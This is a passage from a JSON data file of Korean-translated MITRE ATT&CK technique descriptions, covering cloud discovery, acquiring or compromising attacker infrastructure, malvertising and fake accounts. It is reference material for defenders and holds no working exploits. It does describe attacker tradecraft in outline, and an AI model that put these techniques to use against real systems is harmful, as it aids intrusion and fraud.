수정할 수 있으며, 예를 들어 [사용되지 않거나 지원되지 않는 클라우드 리전](https://attack.mitre.org/techniques/T1535)을 활성화하는 것이 있습니다.",
      "external_id": "T1578.005",
      "modified": "2024-09-25T14:15:26.322Z",
      "title": "Modify Cloud Compute Configurations",
      "translated": true
    },
    {
      "description": "적대자는 인프라스트럭처-애즈-어-서비스(IaaS) 환경 내에서 사용 가능한 인프라 및 자원을 발견하려고 할 수 있습니다. 여기에는 인스턴스, 가상 머신, 스냅샷과 같은 컴퓨팅 서비스 자원뿐만 아니라 저장소 및 데이터베이스 서비스와 같은 다른 서비스의 자원이 포함됩니다.\n\n클라우드 제공자는 인프라에 대한 정보를 제공하기 위해 API 및 CLI를 통해 발행되는 명령과 같은 방법을 제공합니다. 예를 들어, AWS는 Amazon EC2 API 내에 <code>DescribeInstances</code> API를 제공하여 계정 내의 하나 이상의 인스턴스에 대한 정보를 반환할 수 있으며, <code>ListBuckets</code> API는 요청의 인증된 발신자가 소유한 모든 버킷 목록을 반환합니다. 또한 <code>HeadBucket</code> API를 통해 특정 버킷의 존재 및 요청 발신자의 접근 권한을 판단할 수 있으며, <code>GetPublicAccessBlock</code> API를 통해 버킷에 대한 접근 차단 구성 정보를 검색할 수 있습니다. (출처: Amazon Describe Instance)(출처: Amazon Describe Instances API)(출처: AWS Get Public Access Block)(출처: AWS Head Bucket) 유사하게, GCP의 Cloud SDK CLI는 <code>gcloud compute instances list</code> 명령을 제공하여 프로젝트 내의 모든 Google Compute Engine 인스턴스를 나열합니다 (출처: Google Compute Instances), 그리고 Azure의 CLI 명령 <code>az vm list</code>는 가상 머신의 세부 정보를 나열합니다. (출처: Microsoft AZ CLI) API 명령 외에도, 적대자는 [단어 목록 스캐닝](https://attack.mitre.org/techniques/T1595/003)을 통해 클라우드 스토리지 인프라를 발견하기 위해 오픈 소스 도구를 활용할 수 있습니다. (출처: Malwarebytes OSINT Leaky Buckets - Hioureas)\n\n적대자는 손상된 사용자의 접근 키를 사용하여 자원을 나열하여 해당 사용자에게 사용 가능한 자원이 무엇인지 확인할 수 있습니다. (출처: Expel IO Evil in AWS) 이러한 사용 가능한 자원의 발견은 적대자가 클라우드 환경 내에서 다음 단계를 결정하는 데 도움을 줄 수 있으며, 예를 들어 지속성을 구축할 수 있습니다. (출처: Mandiant M-Trends 2020) 또한 적대자는 이 정보를 사용하여 버킷의 구성을 변경하여 공개적으로 접근할 수 있도록 하여 인증 없이 데이터를 접근할 수 있게 할 수 있습니다. 적대자는 <code>DescribeDBInstances</code>와 같은 인프라 발견 API를 사용하여 데이터베이스 리소스의 크기, 소유자, 권한 및 네트워크 ACL을 확인할 수도 있습니다. (출처: AWS Describe DB Instances) 적대자는 이 정보를 통해 데이터베이스의 잠재적 가치를 판단하고 접근에 대한 요구 사항을 발견할 수 있습니다. [클라우드 서비스 발견](https://attack.mitre.org/techniques/T1526)과 달리, 이 기술은 제공되는 서비스의 구성 요소 발견에 초점을 맞추고 있습니다.",
      "external_id": "T1580",
      "modified": "2024-09-30T13:28:37.415Z",
      "title": "Cloud Infrastructure Discovery",
      "translated": true
    },
    {
      "description": "위협 행위자들은 타겟팅 동안 사용할 수 있는 인프라를 구매, 임대, 렌트하거나 확보할 수 있습니다. 위협 행위자의 작업을 호스팅하고 조정하기 위한 다양한 인프라 솔루션이 존재합니다. 인프라 솔루션에는 물리적 또는 클라우드 서버, 도메인 및 타사 웹 서비스가 포함됩니다.(출처: TrendmicroHideoutsLease) 일부 인프라 제공업체는 제한된 비용 또는 무료로 인프라를 확보할 수 있는 무료 체험 기간을 제공합니다.(출처: Free Trial PurpleUrchin) 게다가, 봇넷이 임대 또는 구매할 수 있습니다.\n\n이러한 인프라 솔루션의 사용은 위협 행위자가 작업을 준비하고, 시작하고, 실행할 수 있도록 합니다. 이러한 솔루션은 위협 행위자의 작업이 정상으로 보이는 트래픽과 혼합되도록 도와줄 수 있으며, 예를 들어 타사 웹 서비스에 연락하거나 [프록시](https://attack.mitre.org/techniques/T1090)를 지원하기 위해 인프라를 확보하는 등의 방법이 있습니다. 이는 주거지 프록시 서비스에서 제공되는 인프라를 포함합니다.(출처: amnesty_nso_pegasus)(출처: FBI Proxies Credential Stuffing)(출처: Mandiant APT29 Microsoft 365 2022) 구현에 따라 위협 행위자들은 자신들과 물리적으로 연결하기 어려운 인프라를 사용할 수 있으며, 신속하게 프로비저닝, 수정 및 종료할 수 있는 인프라를 활용할 수 있습니다.",
      "external_id": "T1583",
      "modified": "2024-10-16T20:03:59.884Z",
      "title": "Acquire Infrastructure",
      "translated": true
    },
    {
      "description": "적대 세력은 타깃팅 중에 사용될 수 있는 도메인을 획득할 수 있습니다. 도메인 이름은 하나 이상의 IP 주소를 나타내기 위해 사용되는 인간이 읽을 수 있는 이름입니다. 도메인은 구매하거나 경우에 따라 무료로 획득할 수 있습니다.\n\n적대 세력은 획득한 도메인을 다양한 목적으로 사용할 수 있으며, 여기에는 [피싱](https://attack.mitre.org/techniques/T1566), [드라이브 바이 컴프라미스](https://attack.mitre.org/techniques/T1189), 그리고 명령 및 제어가 포함됩니다.(출처: CISA MSS Sep 2020) 적대 세력은 합법적인 도메인과 유사한 도메인을 선택할 수 있으며, 이는 유사 문자(homoglyphs)를 사용하거나 다른 최상위 도메인(TLD)을 사용하는 방식으로 이루어질 수 있습니다.(출처: FireEye APT28)(출처: PaypalScam) 타이포 스쿼팅(Typosquatting)은 [드라이브 바이 컴프라미스](https://attack.mitre.org/techniques/T1189)를 통해 페이로드 전달을 돕는 데 사용될 수 있습니다. 적대 세력은 또한 국제화 도메인 이름(IDNs) 및 서로 다른 문자 집합(예: 키릴 문자, 그리스 문자 등)을 사용하여 \"IDN 동형 공격\"을 실행할 수 있으며, 이는 피해자 기계에 악성 코드를 전달하는 데 사용되는 시각적으로 유사한 도메인을 생성합니다.(출처: CISA IDN ST05-016)(출처: tt_httrack_fake_domains)(출처: tt_obliqueRAT)(출처: httrack_unhcr)(출처: lazgroup_idn_phishing)\n\n다양한 URI/URL은 피해자에게 악성 콘텐츠를 고유하게 제공하기 위해 동적으로 생성될 수도 있으며, 여기에는 일회용 단일 사용 도메인 이름이 포함됩니다.(출처: iOS URL Scheme)(출처: URI)(출처: URI 사용)(출처: URI 고유)\n\n적대 세력은 만료된 도메인을 획득하고 재사용할 수도 있으며, 이는 기존의 평판/이력에 따라 방어자에 의해 이미 허용되거나 신뢰될 가능성이 있습니다.(출처: Categorisation_not_boundary)(출처: Domain_Steal_CC)(출처: Redirectors_Domain_Fronting)(출처: bypass_webproxy_filtering)\n\n도메인 등록 기관은 모두 등록된 모든 도메인에 대한 연락처 정보를 표시하는 공개적으로 볼 수 있는 데이터베이스를 유지합니다. 개인 WHOIS 서비스는 도메인 소유자 대신 자신의 회사 데이터를 표시하는 등 대체 정보를 제공합니다. 적대 세력은 이러한 개인 WHOIS 서비스를 사용하여 구매한 도메인의 소유자에 대한 정보를 숨길 수 있습니다. 적대 세력은 또한 다양한 등록 정보와 다른 도메인 등록 기관에서 도메인을 구매하여 자신의 인프라를 추적하기 위한 노력을 방해할 수 있습니다.(출처: Mandiant APT1)\n\n정상적으로 도메인을 구매하는 것 외에도, 적대 세력은 침해된 환경에서 새 도메인을 등록할 수 있습니다. 예를 들어, AWS 환경에서는 적대 세력이 Route53 도메인 서비스를 활용하여 도메인을 등록하고 위협 행위자가 선택한 리소스를 가리키는 호스팅 존을 생성할 수 있습니다.(출처: Invictus IR DangerDev 2024)",
      "external_id": "T1583.001",
      "modified": "2024-09-25T15:26:00.047Z",
      "title": "Domains",
      "translated": true
    },
    {
      "description": "적대자는 타겟팅 과정에서 자신의 도메인 네임 시스템(DNS) 서버를 설정할 수 있습니다. 합병 후 활동 중에 적대자는 다양한 작업에 DNS 트래픽을 활용할 수 있으며, 그 중에는 명령 및 제어(Command and Control)도 포함됩니다(예: [응용 계층 프로토콜](https://attack.mitre.org/techniques/T1071)). 기존의 DNS 서버를 탈취하는 대신, 적대자는 운영을 지원하기 위해 자신의 DNS 서버를 구성하고 운영하는 것을 선택할 수 있습니다.\n\n자신의 DNS 서버를 운영함으로써, 적대자는 서버 측 DNS C2 트래픽을 관리하는 데 있어 더 많은 제어력을 가질 수 있습니다([DNS](https://attack.mitre.org/techniques/T1071/004)). DNS 서버에 대한 제어를 갖게 되면, 적대자는 DNS 애플리케이션을 구성하여 악성코드에 조건부 응답을 제공하고, 일반적으로 DNS 기반 C2 채널의 구조에서 더 많은 유연성을 가질 수 있습니다. (출처: Unit42 DNS Mar 2019)",
      "external_id": "T1583.002",
      "modified": "2021-04-15T02:49:49.702Z",
      "title": "DNS Server",
      "translated": true
    },
    {
      "description": "적대자는 타겟팅 과정에서 사용할 수 있는 가상 사설 서버(VPS)를 임대할 수 있습니다. 다양한 클라우드 서비스 제공업체가 가상 머신/컨테이너를 서비스로 판매하고 있습니다. VPS를 활용함으로써 적대자는 자신의 작전을 물리적으로 추적하기 어렵게 만들 수 있습니다. 클라우드 인프라의 사용은 또한 적대자가 자신의 인프라를 빠르게 구성하고 수정하며 종료하는 것을 더 쉽게 만들어줄 수 있습니다.\n\n적대자의 생애 주기 후반 단계, 예를 들어 명령 및 제어(Command and Control)에서 사용할 VPS를 확보하면, 적대자는 신뢰도가 높은 클라우드 서비스 제공업체와 관련된 유비쿼터스(어디서나 존재하는) 및 신뢰의 이점을 누릴 수 있습니다. 적대자는 최소한의 등록 정보로 VPS를 임대하는 것으로 알려진 VPS 서비스 제공업체에서 인프라를 확보하여 보다 익명으로 인프라를 획득할 수도 있습니다.",
      "external_id": "T1583.003",
      "modified": "2024-10-15T13:22:11.113Z",
      "title": "Virtual Private Server",
      "translated": true
    },
    {
      "description": "공격자는 타겟팅 동안 사용할 수 있는 물리적 서버를 구매, 임대 또는 획득할 수 있습니다. 서버를 사용하면 공격자가 작업을 준비하고 실행할 수 있습니다. 손상 이후 활동 중에 공격자는 서버를 다양한 작업에 활용할 수 있습니다. 예를 들어, [드라이브 바이 손상](https://attack.mitre.org/techniques/T1189)에서 워터링 홀 작업을 수행하거나, [피싱](https://attack.mitre.org/techniques/T1566) 작업을 활성화하거나, [명령 및 제어](https://attack.mitre.org/tactics/TA0011)를 촉진하는 데 사용할 수 있습니다. 공격자는 타사 [서버](https://attack.mitre.org/techniques/T1584/004)를 손상시키거나 [가상 사설 서버](https://attack.mitre.org/techniques/T1583/003)를 임대하는 대신, 운영을 지원하기 위해 자신의 서버를 구성하고 실행할 수 있습니다. 클라우드 서버의 무료 체험 기간도 악용될 수 있습니다.(출처: Free Trial PurpleUrchin)(출처: Freejacked)\n\n공격자는 대부분의 활동이 온라인 인프라를 통해 이루어질 경우, 경량 설정만으로 충분할 수 있습니다. 또는, 자신의 시스템에서 활동의 다른 측면을 테스트, 소통 및 제어하고 싶다면 광범위한 인프라를 구축해야 할 수도 있습니다.(출처: NYTStuxnet)",
      "external_id": "T1583.004",
      "modified": "2024-02-28T21:22:52.176Z",
      "title": "Server",
      "translated": true
    },
    {
      "description": "적대자는 타겟팅 중에 사용할 수 있는 손상된 시스템의 네트워크를 구매, 임대 또는 대여할 수 있습니다. 봇넷은 지시를 받아 조정된 작업을 수행할 수 있는 손상된 시스템의 네트워크입니다. (출처: Norton Botnet) 적대자는 부터/스트레서 서비스에서 기존 봇넷을 사용하기 위해 구독을 구매할 수 있습니다. 봇넷을 이용하여 적대자는 대규모 [피싱](https://attack.mitre.org/techniques/T1566) 또는 분산 서비스 거부(DDoS)와 같은 후속 활동을 수행할 수 있습니다. (출처: Imperva DDoS for Hire)(출처: Krebs-Anna)(출처: Krebs-Bazaar)(출처: Krebs-Booter)",
      "external_id": "T1583.005",
      "modified": "2021-04-15T02:49:14.664Z",
      "title": "Botnet",
      "translated": true
    },
    {
      "description": "적대자들은 타겟팅 중에 사용할 수 있는 웹 서비스에 등록할 수 있습니다. 적대자들이 후속 단계에서 악용할 수 있는 웹 기반 서비스에 등록할 수 있는 다양한 인기 웹사이트가 존재합니다. 이러한 후속 단계에는 명령 및 제어([Web Service](https://attack.mitre.org/techniques/T1102)), [웹 서비스를 통한 정보 유출](https://attack.mitre.org/techniques/T1567), 또는 [피싱](https://attack.mitre.org/techniques/T1566) 등이 포함됩니다. Google이나 Twitter와 같은 일반적인 서비스를 사용하면 적대자들이 예상되는 소음 속에 숨는 것이 더 용이해집니다. 웹 서비스를 활용함으로써 적대자들은 자신의 작전을 물리적으로 연결하기 어렵게 만들 수 있습니다.",
      "external_id": "T1583.006",
      "modified": "2024-01-16T22:47:59.395Z",
      "title": "Web Services",
      "translated": true
    },
    {
      "description": "적대 세력은 Cloudflare Workers, AWS Lambda 함수 또는 Google Apps Scripts와 같은 서버리스 클라우드 인프라를 구매하고 구성하여 공격 목표에 사용할 수 있습니다. 서버리스 인프라를 활용함으로써, 적대 세력은 작전 중에 사용된 인프라의 귀속을 더욱 어렵게 만들 수 있습니다.\n\n서버리스 런타임 환경을 확보한 후, 이는 감염된 시스템에 직접 응답하거나 적대자가 소유한 명령 및 제어 서버에 트래픽을 [프록시](https://attack.mitre.org/techniques/T1090)하는 데 활용될 수 있습니다.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps Script Abuse 2021) 이러한 함수에서 생성된 트래픽은 일반 클라우드 제공업체의 하위 도메인에서 오는 것처럼 보일 수 있으므로 이러한 제공업체에 대한 일반 트래픽과 구별하기 어려울 수 있습니다. 이는 [인프라를 숨기기](https://attack.mitre.org/techniques/T1665)를 쉽게 만들어 줍니다.(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",
      "external_id": "T1583.007",
      "modified": "2024-07-01T20:24:16.562Z",
      "title": "Serverless",
      "translated": true
    },
    {
      "description": "적대 세력은 온라인 광고를 구매하여 피해자에게 악성 코드를 배포하는 데 악용할 수 있습니다. 광고는 특정 위치에 아티팩트를 심거나 유리하게 배치할 수 있도록 구매될 수 있으며, 예를 들어 검색 엔진 결과에서 눈에 잘 띄는 위치에 배치될 수 있습니다. 이러한 광고는 사용자가 실제 검색 결과와 광고를 구분하기 어렵게 만들 수 있습니다.(출처: spamhaus-malvertising) 구매된 광고는 광고 네트워크의 기능을 사용하여 특정 대상을 겨냥할 수도 있으며, 이는 본래 검색 엔진과 인기 웹사이트에 주어진 신뢰를 더욱 악용할 수 있습니다.\n\n적대 세력은 악성 코드가 포함된 아티팩트를 피해자에게 배포하는 데 도움이 되는 광고 및 기타 자원을 구매할 수 있습니다. 구매된 광고는 잘 알려진 브랜드를 사칭하거나 스푸핑할 수 있습니다. 예를 들어, 이러한 스푸핑 광고는 피해자를 유인하여 클릭하도록 할 수 있으며, 그 결과 피해자는 악성 도메인으로 전송될 수 있으며, 이는 공식 웹사이트의 클론으로, 광고된 소프트웨어의 트로이화된 버전을 포함할 수 있습니다.(출처: Masquerads-Guardio)(출처: FBI-search) 적대 세력의 악성 도메인 생성 및 광고 구매 노력은 청소 작업을 저항하기 위해 자동화될 수 있습니다.(출처: sentinelone-malvertising)\n\n악성 광고는 [드라이브-바 타겟](https://attack.mitre.org/techniques/T1608/004) 및 [드라이브-바 컴프라미즈](https://attack.mitre.org/techniques/T1189)를 지원하는 데 사용될 수 있으며, 광고가 대상 시스템의 웹 브라우저를 감염시키는 코드/익스플로잇을 포함할 경우 사용자의 상호작용이 최소화될 수 있습니다.(출처: BBC-malvertising)\n\n적대 세력은 광고 네트워크의 탐지를 피하기 위해 여러 기술을 사용할 수도 있습니다. 예를 들어, 적대 세력은 광고 클릭을 동적으로 라우팅하여 자동화된 크롤러/정책 집행 트래픽을 무해한 사이트로 보내고 잠재적 대상을 검증한 후, 실제 광고 클릭에서 유입된 피해자를 악성 페이지로 전송할 수 있습니다. 이 감염 경로는 따라서 광고 네트워크와 유효한 식별자가 없는 방문자에게 숨겨질 수 있습니다.(출처: Masquerads-Guardio) 브랜드 평판 모니터링을 피하기 위해 의도적인 오타 등을 사용하는 등의 다른 기법도 자동 탐지를 피하는 데 사용될 수 있습니다.(출처: spamhaus-malvertising)",
      "external_id": "T1583.008",
      "modified": "2024-10-16T20:10:08.246Z",
      "title": "Malvertising",
      "translated": true
    },
    {
      "description": "위협 행위자들은 타겟팅 과정에서 사용할 수 있는 제3자 인프라를 손상시킬 수 있습니다. 인프라 솔루션에는 물리적 또는 클라우드 서버, 도메인, 네트워크 장치, 제3자 웹 및 DNS 서비스가 포함됩니다. 위협 행위자는 인프라를 구매, 임대 또는 대여하는 대신, 인프라를 손상시켜 다른 단계에서 사용할 수 있습니다. (인용: Mandiant APT1) (인용: ICANN 도메인 이름 탈취) (인용: Talos DNS 스파이 작전 2018년 11월) (인용: FireEye EPS Awakens Part 2) 또한, 위협 행위자들은 여러 대의 기계를 손상시켜 자신들이 활용할 수 있는 봇넷을 형성할 수도 있습니다.\n\n손상된 인프라의 사용은 위협 행위자들이 작전을 기획, 시작 및 실행하는 데 도움을 줍니다. 손상된 인프라는 위협 행위자의 작전이 정상으로 보이는 트래픽과 혼합되는 데 기여할 수 있으며, 이는 신뢰할 수 있는 사이트나 평판이 좋은 사이트와의 접촉을 포함합니다. 예를 들어, 위협 행위자들은 손상된 인프라를 활용하여 (잠재적으로 [디지털 인증서](https://attack.mitre.org/techniques/T1588/004)와 결합하여) 정보 수집을 위한 기획 및/또는 [피싱](https://attack.mitre.org/techniques/T1566) 캠페인을 지원할 수 있습니다. (인용: FireEye DNS 탈취 2019) 또한, 위협 행위자들은 [프록시](https://attack.mitre.org/techniques/T1090) 및/또는 프록시웨어 서비스를 지원하기 위해 인프라를 손상시킬 수도 있습니다. (인용: 암네스티_NSO_페가수스) (인용: Sysdig Proxyjacking)\n\n손상된 인프라를 사용함으로써, 위협 행위자들은 자신의 행동을 다시 그들에게 연결하기 어렵게 만들 수 있습니다. 타겟팅 전에 위협 행위자들은 다른 위협 행위자의 인프라를 손상시킬 수 있습니다. (인용: NSA NCSC Turla OilRig)",
      "external_id": "T1584",
      "modified": "2024-10-16T20:06:03.570Z",
      "title": "Compromise Infrastructure",
      "translated": true
    },
    {
      "description": "공격자는 타겟팅 과정에서 사용할 수 있는 도메인 및/또는 서브도메인을 탈취할 수 있습니다. 도메인 등록 탈취는 원래 등록자의 동의 없이 도메인 이름의 등록을 변경하는 행위입니다. 공격자는 도메인 소유자로 기재된 사람의 이메일 계정에 접근하여, 비밀번호를 잊었다고 주장함으로써 도메인 등록을 변경할 수 있습니다. 다른 가능성으로는 도메인 등록 지원 센터를 사회 공학적으로 이용하여 계정에 접근하거나, 갱신 프로세스의 허점을 이용하거나, 도메인 관리를 가능하게 하는 클라우드 서비스를 침해하는 방법이 있습니다(예: AWS Route53).\n\n서브도메인 탈취는 조직이 존재하지 않거나 제공되지 않는 리소스를 가리키는 DNS 항목을 가지고 있을 때 발생할 수 있습니다. 이러한 경우, 공격자는 해당 도메인과 관련된 신뢰로 이점을 얻기 위해 서브도메인에 대한 통제권을 가질 수 있습니다.\n\n도메인을 침해한 공격자는 기존 DNS 레코드를 유지한 채 자신이 통제하는 악의적인 서브도메인을 생성하여 도메인 그림자화(domain shadowing)에 참여할 수도 있습니다. 서비스가 중단되지 않기 때문에 악의적인 서브도메인은 오랜 시간 동안 눈에 띄지 않을 수 있습니다.",
      "external_id": "T1584.001",
      "modified": "2024-09-24T15:10:40.270Z",
      "title": "Domains",
      "translated": true
    },
    {
      "description": "적대자는 타겟팅 중에 사용할 수 있는 제3자 DNS 서버를 compromise할 수 있습니다. 포스트 컴프라미스 활동 중에, 적대자는 DNS 트래픽을 여러 작업에 활용할 수 있으며, 여기에는 Command and Control을 위한 사용이 포함됩니다(예: [응용 계층 프로토콜](https://attack.mitre.org/techniques/T1071)). 적대자는 자신의 DNS 서버를 설정하는 대신 공격 작전을 지원하기 위해 제3자 DNS 서버를 compromise할 수 있습니다.\n\nDNS 서버를 compromise함으로써, 적대자는 DNS 기록을 변경할 수 있습니다. 이러한 제어력을 통해 조직의 트래픽을 리다이렉션할 수 있으며, 이는 적대자의 수집 및 자격 증명 접근 노력을 용이하게 합니다.(출처: Talos DNSpionage 2018년 11월)(출처: FireEye DNS Hijack 2019년) 또한, 적대자는 [디지털 인증서](https://attack.mitre.org/techniques/T1588/004)와 결합하여 이러한 제어를 활용하여 적대자가 통제하는 인프라로 트래픽을 리다이렉션할 수 있으며, 정상적인 신뢰된 네트워크 통신을 모방할 수 있습니다.(출처: FireEye DNS Hijack 2019년)(출처: Crowdstrike DNS Hijack 2019년) 적대자는 DNS 서버의 실제 소유자에게 알리지 않고 악성 서버를 가리키는 하위 도메인을 은밀히 생성할 수도 있습니다.(출처: CiscoAngler)(출처: Proofpoint Domain Shadowing)",
      "external_id": "T1584.002",
      "modified": "2022-04-19T21:22:13.578Z",
      "title": "DNS Server",
      "translated": true
    },
    {
      "description": "위협 행위자는 타겟팅 동안 사용할 수 있는 제3자 가상 사설 서버(VPS)를 타협할 수 있습니다. 다양한 클라우드 서비스 제공업체가 서비스로서 가상 머신/컨테이너를 판매하고 있습니다. 위협 행위자는 제3자 기관이 구매한 VPS를 타협할 수 있습니다. 인프라로 사용할 VPS를 타협함으로써 위협 행위자는 자신과 연결된 작업을 물리적으로 추적하기 어렵게 만들 수 있습니다. (출처: NSA NCSC Turla OilRig)\n\n위협 행위자는 명령 및 제어와 같은 후속 단계에서 사용할 VPS를 타협함으로써 신뢰할 수 있는 클라우드 서비스 제공업체의 전반적 보편성 및 평판으로 인해 혜택을 누릴 수 있으며, 타협된 제3자의 추가적인 신뢰를 더할 수 있습니다.",
      "external_id": "T1584.003",
      "modified": "2021-10-17T15:59:02.770Z",
      "title": "Virtual Private Server",
      "translated": true
    },
    {
      "description": "적대 세력은 타겟팅 중에 사용할 수 있는 제3자 서버를 손상시킬 수 있습니다. 서버의 사용은 적대 세력이 작전을 준비하고, 시작하며, 실행하는 데 도움을 줍니다. 손상 후 활동 동안, 적대 세력은 커맨드 앤 컨트롤을 포함한 다양한 작업을 수행하기 위해 서버를 활용할 수 있습니다.(출처: TrendMicro EarthLusca 2022) 적대 세력은 [서버](https://attack.mitre.org/techniques/T1583/004) 또는 [가상 사설 서버](https://attack.mitre.org/techniques/T1583/003)를 구매하는 대신, 작전을 지원하기 위해 제3자 서버를 타겟으로 할 수 있습니다.\n\n또한 적대 세력은 [드라이브 바이 컴프라미즈](https://attack.mitre.org/techniques/T1189)와 같은 수생지 공격을 지원하기 위해 웹 서버를 손상시키거나, [피싱](https://attack.mitre.org/techniques/T1566) 작전을 지원하기 위해 이메일 서버를 손상시킬 수 있습니다.",
      "external_id": "T1584.004",
      "modified": "2024-01-31T20:05:44.075Z",
      "title": "Server",
      "translated": true
    },
    {
      "description": "적대 세력은 타겟팅 중에 사용할 수 있는 봇넷을 형성하기 위해 여러 제3자 시스템을 손상시킬 수 있습니다. 봇넷은 지시를 받아 조정된 작업을 수행할 수 있는 손상된 시스템의 네트워크입니다. (인용: Norton Botnet) 적대 세력은 부터/스트레서 서비스에서 봇넷을 구매하거나 임대하는 대신 여러 제3자 시스템을 손상시켜 자신만의 봇넷을 구축할 수 있습니다. (인용: Imperva DDoS for Hire) 또한, 적대 세력은 기존의 봇넷을 인수하여 봇을 적대 세력이 제어하는 C2 서버로 리디렉션하는 등의 행동을 취할 수 있습니다. (인용: Dell Dridex Oct 2015) 적대 세력은 봇넷을 이용해 대규모 [피싱](https://attack.mitre.org/techniques/T1566) 또는 분산 서비스 거부(DDoS)와 같은 후속 활동을 수행할 수 있습니다.",
      "external_id": "T1584.005",
      "modified": "2022-04-19T15:55:58.319Z",
      "title": "Botnet",
      "translated": true
    },
    {
      "description": "적대자는 타겟팅 과정에서 사용할 수 있는 제3자 웹 서비스에 대한 접근을 타협할 수 있습니다. GitHub, Twitter, Dropbox, Google, SendGrid 등과 같은 웹 기반 서비스에 등록할 수 있는 합법적인 사용자들을 위한 다양한 인기 웹사이트가 존재합니다. 적대자는 합법적인 사용자의 웹 서비스 접근 권한을 차지하려고 시도할 수 있으며, 이를 통해 사이버 작전을 지원하기 위한 인프라로 웹 서비스를 사용할 수 있습니다. 이러한 웹 서비스는 적대자 생애 주기의 후속 단계에서 악용될 수 있으며, 예를 들어 지휘 및 통제([Web Service](https://attack.mitre.org/techniques/T1102)), [웹 서비스를 통한 데이터 유출](https://attack.mitre.org/techniques/T1567) 또는 [피싱](https://attack.mitre.org/techniques/T1566) 등에서 사용될 수 있습니다. (출처: Recorded Future Turla Infra 2020) Google이나 Twitter와 같은 일반적인 서비스를 사용하면 적대자가 예상되는 노이즈 속에서 숨기기 훨씬 쉬워집니다. 특히 합법적인 사용자로부터 접근 권한이 도난당했을 때 웹 서비스를 활용하면, 그들의 작전을 물리적으로 추적하기 어렵게 만들 수 있습니다. 또한, 손상된 웹 기반 이메일 서비스를 이용하면 적대자는 합법적인 도메인과 연관된 신뢰를 활용할 수 있습니다.",
      "external_id": "T1584.006",
      "modified": "2024-10-15T16:44:09.114Z",
      "title": "Web Services",
      "translated": true
    },
    {
      "description": "적대 세력은 타겟팅 과정에서 사용할 수 있는 Cloudflare Workers, AWS Lambda 함수 또는 Google Apps Scripts와 같은 서버리스 클라우드 인프라를 침해할 수 있습니다. 서버리스 인프라를 이용함으로써 적대 세력은 작전 중 사용하는 인프라를 자신에게 귀속시키기 어렵게 만들 수 있습니다.\n\n한번 침해되면, 서버리스 런타임 환경을 활용하여 감염된 기계에 직접 응답하거나 [프록시](https://attack.mitre.org/techniques/T1090) 트래픽을 적대 세력이 소유한 명령 및 제어 서버로 전달할 수 있습니다. 이러한 기능에서 생성된 트래픽은 일반 클라우드 제공업체의 하위 도메인에서 발생하는 것처럼 보이기 때문에, 이러한 제공업체에 대한 일반 트래픽과 구별하기 어려워질 수 있습니다. 이는 [인프라 숨기기](https://attack.mitre.org/techniques/T1665)를 용이하게 만듭니다.",
      "external_id": "T1584.007",
      "modified": "2024-10-03T14:18:34.045Z",
      "title": "Serverless",
      "translated": true
    },
    {
      "description": "공격자는 타겟팅 과정에서 사용할 수 있는 제3자 네트워크 장비를 손상시킬 수 있습니다. 소규모 사무실/홈 오피스(SOHO) 라우터와 같은 네트워크 장치가 공격당할 수 있으며, 공격자의 궁극적인 목표가 해당 환경에 대한 [Initial Access](https://attack.mitre.org/tactics/TA0001)가 아닌 경우, 이러한 장비를 활용하여 추가적인 타겟팅을 지원합니다.\n\n공격자가 제어권을 확보하면 손상된 네트워크 장치는 추가 작업을 수행하는 데 사용될 수 있으며, 예를 들어 [Phishing](https://attack.mitre.org/techniques/T1566) 캠페인을 위한 페이로드 호스팅(즉, [Link Target](https://attack.mitre.org/techniques/T1608/005))이나 [Content Injection](https://attack.mitre.org/techniques/T1659) 작업을 실행할 수 있는 필요한 접근을 가능하게 하는 데 활용될 수 있습니다. 공격자는 또한 손상된 네트워크 장치에서 재사용 가능한 자격 증명(즉, [Valid Accounts](https://attack.mitre.org/techniques/T1078))을 수집할 수도 있습니다.\n\n공격자는 종종 강력한 호스트 기반 방어를 지원하지 않는 인터넷에 노출된 엣지 장치 및 관련 네트워크 장치를 타겟팅합니다.(출처: Mandiant Fortinet 제로데이)(출처: Wired 러시아 사이버전)\n\n손상된 네트워크 장치는 이후 [Command and Control](https://attack.mitre.org/tactics/TA0011) 활동을 지원하는 데 사용될 수 있으며, 예를 들어, 설정된 [Proxy](https://attack.mitre.org/techniques/T1090)를 통한 [Hide Infrastructure](https://attack.mitre.org/techniques/T1665) 및/또는 [Botnet](https://attack.mitre.org/techniques/T1584/005) 네트워크 활용 등을 포함합니다.(출처: Justice GRU 2024)",
      "external_id": "T1584.008",
      "modified": "2024-10-15T15:10:59.530Z",
      "title": "Network Devices",
      "translated": true
    },
    {
      "description": "공격자는 목표 설정에 사용될 수 있는 서비스와 관련된 계정을 생성하고 관리할 수 있습니다. 공격자는 작전을 강화하기 위해 개인자를 구축하는 데 사용할 수 있는 계정을 만들 수 있습니다. 개인자 개발에는 공개 정보, 존재감, 이력 및 적절한 제휴의 개발이 포함됩니다. 이러한 개발은 소셜 미디어, 웹사이트 또는 작전 중 그 개인자나 신원을 검증할 수 있는 공개적으로 이용 가능한 기타 정보에 적용될 수 있습니다. (출처: NEWSCASTER2014) (출처: BlackHatRobinSage)\n\n사회 공학을 포함한 작전의 경우, 온라인 개인자의 활용이 중요할 수 있습니다. 이러한 개인자는 허구일 수도 있고, 실제 인물을 가장할 수도 있습니다. 개인자는 단일 사이트 또는 여러 사이트(예: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub 등)에서 존재할 수 있습니다. 개인자를 설정하려면 그들이 현실적으로 보이도록 하기 위한 추가 문서 개발이 필요할 수도 있습니다. 여기에는 프로필 정보 작성, 소셜 네트워크 개발 또는 사진 포함이 포함될 수 있습니다. (출처: NEWSCASTER2014) (출처: BlackHatRobinSage)\n\n계정을 설정하는 것은 이메일 제공업체와 계정을 생성하는 것을 포함할 수 있으며, 이는 [정보 피싱](https://attack.mitre.org/techniques/T1598) 또는 [피싱](https://attack.mitre.org/techniques/T1566)에 직접 활용될 수 있습니다. (출처: Mandiant APT1) 또한, 계정을 설정함으로써 공격자는 악의적인 목적을 위해 [인프라 획득](https://attack.mitre.org/techniques/T1583) 을 위해 무료 서비스를 남용할 수 있습니다. (출처: Free Trial PurpleUrchin)",
      "external_id": "T1585",
      "modified": "2024-02-28T21:08:56.520Z",
      "title": "Establish Accounts",
      "translated": true
    },
    {
